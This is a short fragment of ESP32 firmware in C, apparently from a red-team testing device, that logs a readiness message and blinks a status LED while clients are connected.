    ESP_LOGI(TAG, "🔧 Professional Red Team Testing Ready");
    ESP_LOGI(TAG, "⚠️  FOR AUTHORIZED TESTING ONLY");
    
    // Main loop
    while (1) {
        vTaskDelay(pdMS_TO_TICKS(1000));
        
        // Status LED blink pattern based on client count
        if (g_config.client_count > 0) {
            gpio_set_level(STATUS_LED_PIN, 1);
            vTaskDelay(pdMS_TO_TICKS(100));
            gpio_set_level(STATUS_LED_PIN, 0);
            vTaskDelay(pdMS_TO_TICKS(100));
        }
    }
}